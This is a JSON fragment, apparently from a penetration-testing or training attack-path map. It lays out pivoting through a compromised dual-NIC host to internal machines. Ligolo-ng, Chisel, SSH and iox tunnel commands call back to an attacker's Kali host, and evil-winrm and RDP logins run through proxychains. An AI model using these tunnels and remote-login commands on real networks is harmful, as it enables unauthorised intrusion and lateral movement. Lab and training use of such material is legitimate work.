  "connections": [
    {"from": "pivot", "to": "target1", "technique": "Ligolo-ng/Chisel/SSH/iox", "requires": "Shell on PIVOT", "pivot": "PIVOT dual-NIC", "path_ids": ["path-ligolo", "path-chisel", "path-ssh", "path-iox"], "commands": [
      {"cmd": "# Ligolo-ng: agent -connect <kali>:11601 -ignore-cert → ip route add 10.10.20.0/24 dev ligolo", "rationale": "Why: Agent creates tunnel; route sends internal traffic through it"},
      "# Chisel: chisel server --reverse -p 8000; on PIVOT: chisel client <kali>:8000 R:socks",
      "# SSH: ssh -D 1080 -N pivot@192.168.10.100 → proxychains",
      "# iox: iox -l 1080 -r <kali>:1080 → proxychains",
      {"cmd": "proxychains evil-winrm -i 10.10.20.10 -u admin -p '<password>'", "rationale": "Why: Route WinRM through tunnel to reach internal host"}
    ]},
    {"from": "pivot", "to": "target2", "technique": "Tunnel to TARGET2 via PIVOT", "requires": "Active tunnel through PIVOT", "pivot": "PIVOT dual-NIC", "path_ids": ["path-ligolo", "path-chisel", "path-ssh", "path-iox"], "commands": [
      "proxychains curl http://10.10.20.20",
      "proxychains xfreerdp /u:admin /p:'<password>' /v:10.10.20.20"
    ]}
  ],

  "attack_paths": [
    {"id": "path-ligolo", "name": "Ligolo-ng", "color": "#6bb8cc", "steps": ["pivot", "target1", "target2"], "description": "ligolo-ng agent on PIVOT → ifconfig tun → ip route add 10.10.20.0/24 dev ligolo"},
    {"id": "path-chisel", "name": "Chisel", "color": "#e8a87c", "steps": ["pivot", "target1", "target2"], "description": "chisel server --reverse; on PIVOT: chisel client <kali>:8000 R:445:10.10.20.10:445 R:5985:10.10.20.10:5985"},
    {"id": "path-ssh", "name": "SSH Tunnel", "color": "#85e89d", "steps": ["pivot", "target1", "target2"], "description": "ssh -D 1080 -N pivot@192.168.10.100; proxychains -q -f /etc/proxychains4.conf"},
    {"id": "path-iox", "name": "iox", "color": "#d2a8ff", "steps": ["pivot", "target1", "target2"], "description": "iox -l 1080 -r <kali-ip>:1080; proxychains"}
  ]
